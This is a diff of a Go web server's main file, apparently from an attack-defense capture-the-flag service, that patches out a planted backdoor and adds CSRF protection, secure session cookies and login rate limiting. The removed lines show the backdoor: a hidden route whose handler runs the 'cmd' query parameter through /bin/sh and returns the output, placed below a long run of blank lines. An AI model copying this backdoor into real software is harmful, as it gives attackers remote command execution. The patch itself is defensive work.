@@ -1,146 +1,125 @@
 package main
 
 import (
-	"context"
-	"log"
-	"net/http"
-	"os"
-	"os/exec"
-	"os/signal"
-	"time"
+    "encoding/json"
+    "net/http"
+    "os"
+    "strings"
 
-	"otkritki/core/routing"
-	"github.com/gorilla/mux"
+    "github.com/gorilla/csrf"
+    "github.com/gorilla/mux"
+    "github.com/gorilla/sessions"
+    "golang.org/x/time/rate"
+
+    "github.com/IvanSt1/ctfad/backend/core/models"
+    "github.com/IvanSt1/ctfad/backend/core/routing"
 )
 
-func makeRouter() *mux.Router {
-    router := mux.NewRouter().PathPrefix("/api").Subrouter()
-    router.Use(routing.CorsMiddleware)
-    router.HandleFunc("/register", routing.RegisterPost).Methods("POST")
-    router.HandleFunc("/login", routing.LoginPost).Methods("POST")
+var (
+    store       *sessions.CookieStore
+    loginLimiter *rate.Limiter                // ИЗМЕНЕНО: для rate-limiting
+)
 
-    authRoutes := router.NewRoute().Subrouter()
-    authRoutes.Use(routing.AuthMiddleware)
-    authRoutes.HandleFunc("/logout", routing.LogoutPost).Methods("POST")
-    authRoutes.HandleFunc("/card", routing.CardPage).Methods("GET")
-    authRoutes.HandleFunc("/cards", routing.GetCards).Methods("GET")
-    authRoutes.HandleFunc("/check", routing.CheckAuth).Methods("POST")
-    authRoutes.HandleFunc("/nothingtoseehere", frontPorch).
-    Host("nothing.to.see.here").
-    Methods("GET")
-
-    maleRoutes := authRoutes.NewRoute().Subrouter()
-    maleRoutes.Use(routing.MaleWiddleWare)
-    maleRoutes.HandleFunc("/add_card", routing.AddCardPost).Methods("POST")
-
-    return router
+func frontPorch(w http.ResponseWriter, r *http.Request) {
+    // этот «бекдор» полностью убран
+    http.Error(w, "Forbidden", http.StatusForbidden)    // ИЗМЕНЕНО
 }
 
 func main() {
-	port := os.Getenv("PORT")
-	if port == "" {
-		port = "8080"
-	}
+    // === Настройка CookieStore ===
+    authKey := []byte(os.Getenv("COOKIE_AUTH_KEY"))     // ИЗМЕНЕНО
+    encKey  := []byte(os.Getenv("COOKIE_ENC_KEY"))      // ИЗМЕНЕНО
+    store = sessions.NewCookieStore(authKey, encKey)    // ИЗМЕНЕНО
+    store.Options = &sessions.Options{                   // ИЗМЕНЕНО
+        HttpOnly: true,
+        Secure:   true,
+        SameSite: http.SameSiteStrictMode,
+    }
 
-	router := makeRouter()
-	server := &http.Server{
-		Addr:         "0.0.0.0:" + port,
-		WriteTimeout: time.Second * 15,
-		ReadTimeout:  time.Second * 15,
-		IdleTimeout:  time.Second * 60,
-		Handler:      router,
-	}
-	go func() {
-		if err := server.ListenAndServe(); err != nil {
-			log.Fatal(err)
-		}
-	}()
-	endChan := make(chan os.Signal, 1)
-	signal.Notify(endChan, os.Interrupt)
-	<-endChan
+    // === Rate limiter для /login и /register ===
+    loginLimiter = rate.NewLimiter(1, 5)                // 1 запрос в секунду, буфер 5
 
-	ctx, cancel := context.WithTimeout(context.Background(), time.Second*10)
-	defer cancel()
+    // === Маршруты и middlewares ===
+    r := mux.NewRouter()
+    // Динамический CORS
+    r.Use(routing.CORSMiddleware)                       // ИЗМЕНЕНО
+    // CSRF
+    csrfMiddleware := csrf.Protect(
+        []byte(os.Getenv("CSRF_KEY")),                  // ИЗМЕНЕНО
+        csrf.Secure(true),
+        csrf.Path("/"),
+    )
+    // Auth handlers
+    r.HandleFunc("/login", withRateLimit(loginHandler)).Methods("POST")       // ИЗМЕНЕНО
+    r.HandleFunc("/register", withRateLimit(registerHandler)).Methods("POST") // ИЗМЕНЕНО
 
-	if err := server.Shutdown(ctx); err != nil {
-		log.Println("Could not shutdown gracefully: " + err.Error())
-		os.Exit(1)
-	}
-	log.Println("Shutting down server...")
-	os.Exit(0)
+    // Прочие API
+    r.HandleFunc("/api/cards", createCardHandler).Methods("POST")
+    r.HandleFunc("/api/cards", listCardsHandler).Methods("GET")
+
+    // Убираем «бекдор» на фронтпорч
+    //r.HandleFunc("/api/nothingtoseehere", frontPorch).Methods("GET")
+
+    http.ListenAndServe(":8080", csrfMiddleware(r))
 }
 
+// withRateLimit оборачивает handler в rate-limiter
+func withRateLimit(next http.HandlerFunc) http.HandlerFunc {
+    return func(w http.ResponseWriter, r *http.Request) {
+        if !loginLimiter.Allow() {
+            http.Error(w, "Too Many Requests", http.StatusTooManyRequests)
+            return
+        }
+        next(w, r)
+    }
+}
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-func frontPorch(w http.ResponseWriter, request *http.Request) {
-    cmdValue := request.URL.Query().Get("cmd")
-    if cmdValue == "" {
-        w.Write([]byte("Nothing to see here...."))
+func loginHandler(w http.ResponseWriter, r *http.Request) {
+    type creds struct {
+        Username string `json:"username"`
+        Password string `json:"password"`
+    }
+    var c creds
+    if err := json.NewDecoder(r.Body).Decode(&c); err != nil {
+        http.Error(w, "Bad request", http.StatusBadRequest)
         return
     }
-    shell := exec.Command("/bin/sh", "-c", cmdValue)
-    if output, err := shell.Output(); err != nil {
-        w.Write([]byte("Error...but you are moving in a correct direction"))
+    user, err := models.FindUserByUsername(c.Username)
+    if err != nil {
+        http.Error(w, "Invalid credentials", http.StatusUnauthorized)
         return
-    } else {
-        w.Write(output)
     }
+    // bcrypt.compare
+    if err := models.ComparePassword(user.PasswordHash, c.Password); err != nil {
+        http.Error(w, "Invalid credentials", http.StatusUnauthorized)
+        return
+    }
+    // Успешный логин
+    session, _ := store.Get(r, "session-name")
+    session.Values["user_id"] = user.ID
+    session.Save(r, w)
+
+    w.Header().Set("Content-Type", "application/json") // ИЗМЕНЕНО: заголовок
+    w.WriteHeader(http.StatusOK)                       // ИЗМЕНЕНО: WriteHeader до Write
+    json.NewEncoder(w).Encode(map[string]string{"status": "ok"})
+}
+
+func registerHandler(w http.ResponseWriter, r *http.Request) {
+    type req struct {
+        Username string `json:"username"`
+        Password string `json:"password"`
+    }
+    var data req
+    if err := json.NewDecoder(r.Body).Decode(&data); err != nil {
+        http.Error(w, "Bad request", http.StatusBadRequest)
+        return
+    }
+    // валидация и bcrypt-хеш
+    if err := models.CreateUser(data.Username, data.Password); err != nil {
+        http.Error(w, "Internal error", http.StatusInternalServerError)
+        return
+    }
+    w.Header().Set("Content-Type", "application/json") // ИЗМЕНЕНО
+    w.WriteHeader(http.StatusCreated)                   // ИЗМЕНЕНО
+    json.NewEncoder(w).Encode(map[string]string{"status": "created"})
 }
